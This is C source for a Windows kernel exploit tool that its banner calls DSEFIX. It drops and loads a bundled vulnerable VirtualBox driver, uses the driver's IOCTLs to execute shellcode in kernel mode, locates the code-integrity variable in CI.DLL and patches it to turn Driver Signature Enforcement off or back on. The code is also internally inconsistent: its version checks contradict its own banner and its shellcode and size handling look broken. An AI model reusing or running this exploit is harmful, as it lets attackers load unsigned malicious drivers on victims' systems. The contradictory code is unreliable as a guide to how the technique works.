#include "ntdll\ntdll.h"
#include "ntdll\ntstatus.h"
#include "main.h"
#include "vbox.h"
#include "vboxdrv.h"
#include "ldasm.h"
#include "rtls\prtl.h"
#include "ntdll\winnative.h"

#pragma data_seg("Shared")
volatile LONG g_lApplicationInstances = 0;
#pragma data_seg()
#pragma comment(linker, "/Section:Shared,RWS")

RTL_OSVERSIONINFOEXW      osv;

// Disable DSE (Windows 10)
const unsigned char shellcode4[] = {
   0x48, 0x31, 0xc0, 0xc3  // xor rax, rax; ret
};

// Disable DSE (Windows 11)
const unsigned char shellcode5[] = {
   0x48, 0x31, 0xc0, 0xc3  // xor rax, rax; ret
};

// Enable DSE (Windows 10 and 11)
const unsigned char shellcode2[] = {
   0x48, 0x31, 0xc0, 0xb0, 0x06, 0xc3  // xor rax, rax; mov al, 6; ret
};

DWORD align_gt(DWORD p, DWORD align)
{
   if ( (p % align) == 0 )
      return p;

   return p + align - (p % align);
}

DWORD align_le(DWORD p, DWORD align)
{
   if ( (p % align) == 0 )
      return p;

   return p - (p % align);
}

LPVOID PELoaderLoadImage(IN LPVOID Buffer, PDWORD SizeOfImage)
{
   LPVOID               exeBuffer = NULL;
   PIMAGE_DOS_HEADER      dosh = (PIMAGE_DOS_HEADER)Buffer;
   PIMAGE_FILE_HEADER      fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
   PIMAGE_OPTIONAL_HEADER   popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
   PIMAGE_SECTION_HEADER   sections = (PIMAGE_SECTION_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER) + fileh->SizeOfOptionalHeader);
   DWORD               c, p, rsz;
   PIMAGE_BASE_RELOCATION   rel;
   DWORD_PTR            delta;
   LPWORD               chains;

   do {

      *SizeOfImage = popth->SizeOfImage;
      exeBuffer = VirtualAlloc(NULL, popth->SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
      if ( exeBuffer == NULL )
         break;

      // render image
      memcpy(exeBuffer, Buffer, align_gt(popth->SizeOfHeaders, popth->FileAlignment));

      for (c=0; c<fileh->NumberOfSections; c++)
         if ( (sections[c].SizeOfRawData > 0) && (sections[c].PointerToRawData > 0) )
            memcpy( (PBYTE)exeBuffer + sections[c].VirtualAddress,
                  (PBYTE)Buffer + align_le(sections[c].PointerToRawData, popth->FileAlignment),
                  align_gt(sections[c].SizeOfRawData, popth->FileAlignment) );

      // reloc image
      dosh = (PIMAGE_DOS_HEADER)exeBuffer;
      fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
      popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
      sections = (PIMAGE_SECTION_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER) + fileh->SizeOfOptionalHeader);

      if ( popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC )
         if ( popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 )
         {
            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)exeBuffer + popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
            rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            delta = (DWORD_PTR)exeBuffer - popth->ImageBase;

            c = 0;
            while ( c < rsz ) {
               p = sizeof(IMAGE_BASE_RELOCATION);
               chains = (LPWORD)((PBYTE)rel + p);

               while ( p < rel->SizeOfBlock ) {

                  switch (*chains >> 12) {
                  case IMAGE_REL_BASED_HIGHLOW:
                     *(LPDWORD)((ULONG_PTR)exeBuffer + rel->VirtualAddress + (*chains & 0x0fff) ) += (DWORD)delta;
                     break;
                  case IMAGE_REL_BASED_DIR64:
                     *(PULONGLONG)((ULONG_PTR)exeBuffer + rel->VirtualAddress + (*chains & 0x0fff) ) += delta;
                     break;
                  }

                  chains++;
                  p += sizeof(WORD);
               }

               c += rel->SizeOfBlock;
               rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
            }
         }
      
      return exeBuffer;
   } while ( FALSE );

   return NULL;
}

LPVOID PELoaderGetProcAddress(LPVOID ImageBase, PCHAR RoutineName )
{
   PIMAGE_EXPORT_DIRECTORY      ExportDirectory = NULL;
   PIMAGE_FILE_HEADER         fh1  = NULL;
   PIMAGE_OPTIONAL_HEADER32   oh32 = NULL;
   PIMAGE_OPTIONAL_HEADER64   oh64 = NULL;

   USHORT      OrdinalNumber;
   PULONG      NameTableBase;
   PUSHORT      NameOrdinalTableBase;
   PULONG      Addr;
   LONG      Result;
   ULONG      High, Low, Middle = 0;

   fh1 = (PIMAGE_FILE_HEADER)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew + sizeof(DWORD) );
   oh32 = (PIMAGE_OPTIONAL_HEADER32)((ULONG_PTR)fh1 + sizeof(IMAGE_FILE_HEADER));
   oh64 = (PIMAGE_OPTIONAL_HEADER64)oh32;

   if (fh1->Machine == IMAGE_FILE_MACHINE_AMD64) {
      ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
         oh64->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
   } else {
      ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
         oh32->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
   }

   NameTableBase = (PULONG)((PBYTE)ImageBase + (ULONG)ExportDirectory->AddressOfNames);
   NameOrdinalTableBase = (PUSHORT)((PBYTE)ImageBase + (ULONG)ExportDirectory->AddressOfNameOrdinals);
   Low = 0;
   High = ExportDirectory->NumberOfNames - 1;
   while (High >= Low)   {

      Middle = (Low + High) >> 1;

      Result = _strcmpA(
         RoutineName,
         (char *)ImageBase + NameTableBase[Middle]
         );

      if (Result < 0)   {

         High = Middle - 1;

      } else {

         if (Result > 0)   {

            Low = Middle + 1;
            
         } else {

            break;
         }
      }
   } //while
   if (High < Low)   
      return NULL;

   OrdinalNumber = NameOrdinalTableBase[Middle];
   if ((ULONG)OrdinalNumber >= ExportDirectory->NumberOfFunctions)
      return NULL;

   Addr = (PULONG)((PBYTE)ImageBase + (ULONG)ExportDirectory->AddressOfFunctions);
   return (LPVOID)((PBYTE)ImageBase + Addr[OrdinalNumber]);
}

BOOL ControlDSE(HANDLE hDriver, ULONG_PTR g_CiAddress, PVOID shellcode)
{
   BOOL         bRes = FALSE;
   SUPCOOKIE      Cookie;
   SUPLDROPEN      OpenLdr;
   DWORD         bytesIO = 0;
   PVOID         ImageBase = NULL;
   PSUPLDRLOAD      pLoadTask = NULL;
   SUPSETVMFORFAST vmFast;

   if (!ARGUMENT_PRESENT(hDriver))
      return FALSE;
   if (!ARGUMENT_PRESENT(g_CiAddress))
      return FALSE;
   if (!ARGUMENT_PRESENT(shellcode))
      return FALSE;

   memset(&Cookie, 0, sizeof(SUPCOOKIE));

   Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
   Cookie.Hdr.cbIn =  SUP_IOCTL_COOKIE_SIZE_IN;
   Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
   Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
   Cookie.Hdr.rc = 0;
   Cookie.u.In.u32ReqVersion = 0;
   Cookie.u.In.u32MinVersion = 0x00070002;
   _strcpyA(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC);

   if (!DeviceIoControl(hDriver, SUP_IOCTL_COOKIE, &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
      SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL)) goto fail;

   memset(&OpenLdr, 0, sizeof(OpenLdr));

   OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
   OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
   OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
   OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
   OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
   OpenLdr.Hdr.rc = 0;
   OpenLdr.u.In.cbImage = sizeof(OpenLdr.u.In.szName);
   OpenLdr.u.In.szName[0] = 'a';
   OpenLdr.u.In.szName[1] = 0;

   if (!DeviceIoControl(hDriver, SUP_IOCTL_LDR_OPEN, &OpenLdr, SUP_IOCTL_LDR_OPEN_SIZE_IN,
      &OpenLdr, SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL)) goto fail;

   ImageBase = OpenLdr.u.Out.pvImageBase;

   pLoadTask = (PSUPLDRLOAD)VirtualAlloc(NULL, 0x90, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
   if (pLoadTask == NULL) goto fail;

   memset(pLoadTask, 0, 0x90);

   pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
   pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
   pLoadTask->Hdr.cbIn = 0x88;
   pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
   pLoadTask->Hdr.fFlags =  SUPREQHDR_FLAGS_MAGIC;
   pLoadTask->Hdr.rc = 0;
   pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
   pLoadTask->u.In.pvImageBase = (RTR0PTR)ImageBase;
   pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)(ULONG_PTR)0x1000;
   pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = (RTR0PTR)ImageBase;
   pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = (RTR0PTR)ImageBase;
   pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = (RTR0PTR)ImageBase;
   memcpy(pLoadTask->u.In.achImage, shellcode, sizeof(shellcode));
   pLoadTask->u.In.cbImage = 0x20;

   if (!DeviceIoControl(hDriver, SUP_IOCTL_LDR_LOAD, pLoadTask, 0x88,
      pLoadTask, sizeof(SUPREQHDR), &bytesIO, NULL)) goto fail;

   vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
   vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
   vmFast.Hdr.rc = 0;
   vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
   vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
   vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
   vmFast.u.In.pVMR0 = (PVOID)(ULONG_PTR)0x1000;

   if (!DeviceIoControl(hDriver, SUP_IOCTL_SET_VM_FOR_FAST, &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
      &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL)) goto fail;

   bRes = DeviceIoControl(hDriver, SUP_IOCTL_FAST_DO_NOP, (LPVOID)g_CiAddress, 0, (LPVOID)g_CiAddress, 0, &bytesIO, NULL);

fail:
   if (pLoadTask != NULL) VirtualFree(pLoadTask, 0, MEM_RELEASE);
   if (hDriver != NULL) CloseHandle(hDriver);
   return bRes;
}

BOOL DoWork(HANDLE hDriver, BOOL bDisable)
{
   BOOL                  bRes = FALSE;
   PRTL_PROCESS_MODULES      miSpace = NULL;
   ULONG                  rl = 0, c;
   LONG                  rel = 0;
   NTSTATUS               ntStatus = STATUS_UNSUCCESSFUL;
   CHAR                  KernelFullPathName[BUFFER_SIZE];
   CHAR                  textbuf[BUFFER_SIZE];
   PVOID                  sc = NULL, kBuffer = NULL, MappedKernel = NULL;
   PBYTE                  CiInit = NULL;
   ULONG_PTR               KernelBase = 0L;
   HANDLE                  hFile = INVALID_HANDLE_VALUE;
   LARGE_INTEGER            fsz;
   ldasm_data               ld;

   if (!ARGUMENT_PRESENT(hDriver))
      return FALSE;

   do {

      miSpace = (PRTL_PROCESS_MODULES)VirtualAllocEx(GetCurrentProcess(), NULL, 1024*1024, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
      if ( miSpace == NULL )
         break;
      
      ntStatus = NtQuerySystemInformation(SystemModuleInformation, miSpace, 1024*1024, &rl);
      if ( !NT_SUCCESS(ntStatus) )
         break;

      if ( miSpace->NumberOfModules == 0 )
         break;

      rl = GetSystemDirectoryA(KernelFullPathName, MAX_PATH);
      if ( rl == 0 )
         break;
      
      KernelFullPathName[rl] = (CHAR)'\\';
      
      
      _strcpyA(textbuf, "[DF] Windows v");
      ultostrA(osv.dwMajorVersion, _strendA(textbuf));
      _strcatA(textbuf, ".");
      ultostrA(osv.dwMinorVersion, _strendA(textbuf));
      OutputDebugStringA(textbuf);

      if ( osv.dwMinorVersion < 2 ) {
         _strcpyA(&KernelFullPathName[rl+1], (const char*)&miSpace->Modules[0].FullPathName[miSpace->Modules[0].OffsetToFileName]);
         KernelBase = (ULONG_PTR)miSpace->Modules[0].ImageBase;
      } else {
         _strcpyA(&KernelFullPathName[rl+1], "CI.DLL");
         for (c=0; c<miSpace->NumberOfModules; c++)
            if ( _strcmpiA((const char *)&miSpace->Modules[c].FullPathName[miSpace->Modules[c].OffsetToFileName], "CI.DLL") == 0 ) {
               KernelBase = (ULONG_PTR)miSpace->Modules[c].ImageBase;
               break;
            }
      }

      VirtualFreeEx(GetCurrentProcess(), miSpace, 0, MEM_RELEASE);
      miSpace = NULL;

      _strcpyA(textbuf, "[DF] Target module ");
      _strcatA(textbuf, KernelFullPathName);
      OutputDebugStringA(textbuf);

      hFile = CreateFileA(KernelFullPathName, SYNCHRONIZE | FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

      _strcpyA(textbuf, "[DF] Module base ");
      u64tohexA(KernelBase, _strendA(textbuf));
      OutputDebugStringA(textbuf);

      if ( hFile == INVALID_HANDLE_VALUE )
         break;
      fsz.QuadPart = 0;
      GetFileSizeEx(hFile, &fsz);

      kBuffer = (PRTL_PROCESS_MODULES)VirtualAllocEx(GetCurrentProcess(), NULL, fsz.LowPart, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
      if ( kBuffer == NULL )
         break;
      if ( !ReadFile(hFile, kBuffer, fsz.LowPart, &rl, NULL) )
         break;
      CloseHandle(hFile);
      hFile = INVALID_HANDLE_VALUE;

      MappedKernel = PELoaderLoadImage(kBuffer, &rl);
      if (MappedKernel == NULL)
         break;

      VirtualFreeEx(GetCurrentProcess(), kBuffer, 0, MEM_RELEASE);
      kBuffer = NULL;
      
      /* find g_CiEnabled vista, seven */
      if ( osv.dwMinorVersion < 2 ) {
         for (c=0; c<rl-sizeof(DWORD); c++) {
            if ( *(PDWORD)((PBYTE)MappedKernel + c) == 0x1d8806eb ) {
               rel = *(PLONG)((PBYTE)MappedKernel + c+4);
               KernelBase = KernelBase + c+8 + rel;
               break;
            }
         }
      } else {
         /* find g_CiOptions w8, blue */
         CiInit = (PBYTE)PELoaderGetProcAddress(MappedKernel, "CiInitialize");
         c=0;
         do {
            if ( CiInit[c] == 0xE9 ) {      /* jmp CipInitialize */
               rel = *(PLONG)(CiInit+c+1);
               break;
            }
            c += ldasm(CiInit+c, &ld, 1);
         } while (c < 256);
         CiInit = CiInit + c+5 + rel;
         c=0;
         do {
            if ( *(PUSHORT)(CiInit+c) == 0x0d89 ) {
               rel = *(PLONG)(CiInit+c+2);
               break;
            }
            c += ldasm(CiInit+c, &ld, 1);
         } while (c < 256);
         CiInit = CiInit + c+6 + rel;
         KernelBase = KernelBase + CiInit - (PBYTE)MappedKernel;
      }

      if ( rel == 0 )
         break;

      _strcpyA(textbuf, "[DF] Apply patch to address ");
      u64tohexA(KernelBase, _strendA(textbuf));
      OutputDebugStringA(textbuf);

   if (bDisable) {
      if (osv.dwMajorVersion == 10) {
         sc = (PVOID)shellcode4;
      } else if (osv.dwMajorVersion == 11) {
         sc = (PVOID)shellcode5;
      }
   } else {
      sc = (PVOID)shellcode2;
   }

   bRes = ControlDSE(hDriver, KernelBase, sc);

   } while ( FALSE );

   if ( hFile != INVALID_HANDLE_VALUE )
      CloseHandle(hFile);
   if ( kBuffer != NULL )
      VirtualFreeEx(GetCurrentProcess(), kBuffer, 0, MEM_RELEASE);
   if ( MappedKernel != NULL )
      VirtualFreeEx(GetCurrentProcess(), MappedKernel, 0, MEM_RELEASE);
   if ( miSpace != NULL )
      VirtualFreeEx(GetCurrentProcess(), miSpace, 0, MEM_RELEASE);

   return bRes;
}

HANDLE LoadVulnerableDriver(
   VOID
   )
{
   HANDLE                hDriver = NULL;
   NTSTATUS             Status = STATUS_UNSUCCESSFUL;
   UNICODE_STRING       drvname;
   OBJECT_ATTRIBUTES    attr;
   WCHAR                szDriverBuffer[BUFFER_SIZE];   

   RtlSecureZeroMemory(szDriverBuffer, BUFFER_SIZE);
   _strcpyW(szDriverBuffer, L"\\??\\");

   if (GetSystemDirectory(&szDriverBuffer[4], MAX_PATH)) {

      _strcatW(szDriverBuffer, L"\\drivers\\ultra4.sys");

      Status = (NTSTATUS)NativeWriteBufferToFile(&szDriverBuffer[4], VBoxDrv,
         sizeof(VBoxDrv), FALSE, FALSE);

      if ( NT_SUCCESS(Status) ) {
         Status = NativeLoadDriver(szDriverBuffer, VBoxDrvRegPath, VBoxDrvDispName);
         if ( NT_SUCCESS(Status) ) {
            hDriver = NativeOpenDevice(VBoxDrvDevName, NULL);
         }

         RtlInitUnicodeString(&drvname, szDriverBuffer);
         InitializeObjectAttributes(&attr, &drvname, OBJ_CASE_INSENSITIVE, 0, NULL);
         NtDeleteFile(&attr);
      }
   }
   return hDriver;
}

void UnloadVulnerableDriver(
   VOID
   )
{
   NativeUnLoadDriver(VBoxDrvRegPath);
   NativeRegDeleteKeyRecursive(0, VBoxDrvRegPath);
}

void main()
{
   LONG x;
   ULONG l = 0;
   HANDLE hDriver = NULL;
   WCHAR cmdLineParam[MAX_PATH];
   BOOL bDisable = TRUE;
   
   OutputDebugStringA("[DF] DSEFIX v1.0 started (c) 2014 EP_X0FF, MP_ART, nrin");
   OutputDebugStringA("[DF] Supported x64 OS: from NT6.0 up to NT6.3");

   x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
   if ( x > 1 ) {
      InterlockedDecrement((PLONG)&g_lApplicationInstances);
      OutputDebugStringA("[DF] Another instance running, close it before");
      ExitProcess(0);
      return;
   }

   RtlSecureZeroMemory(&osv, sizeof(osv));
   osv.dwOSVersionInfoSize = sizeof(osv);
   RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);
   if (osv.dwMajorVersion != 10 && osv.dwMajorVersion != 11) {
      InterlockedDecrement((PLONG)&g_lApplicationInstances);
      OutputDebugStringA("[DF] Unsuppoted OS");
      ExitProcess(0);
      return;
   }

   RtlSecureZeroMemory(cmdLineParam, sizeof(cmdLineParam));
   GetCommandLineParamW(GetCommandLineW(), 1, cmdLineParam, MAX_PATH, &l);

   if ( _strcmpiW(cmdLineParam, L"-e") == 0 ) {
      OutputDebugStringA("[DF] DSE will be (re)enabled");
      bDisable = FALSE;
   } else {
      OutputDebugStringA("[DF] DSE will be disabled");
      bDisable = TRUE;
   }

   //assign driver load privilege
   if (NT_SUCCESS(NativeAdjustPrivileges(SE_LOAD_DRIVER_PRIVILEGE))) {

      OutputDebugStringA("[DF] Load driver privilege adjusted");

      hDriver = LoadVulnerableDriver();
      if (hDriver != NULL) {

         OutputDebugStringA("[DF] Vulnerable driver loaded");

         //manupulate kernel variable      
         if (DoWork(hDriver, bDisable)) {
            OutputDebugStringA("[DF] Kernel memory patched");
         } else {
            OutputDebugStringA("[DF] Failed to patch kernel memory");
         }

         OutputDebugStringA("[DF] Cleaning up");
         UnloadVulnerableDriver();
      } else {
         OutputDebugStringA("[DF] Failed to load vulnerable driver");
      }

   } else {
      OutputDebugStringA("[DF] Cannot adjust privilege");
   }
   InterlockedDecrement((PLONG)&g_lApplicationInstances);
   OutputDebugStringA("[DF] Finish");
   ExitProcess(0);
}
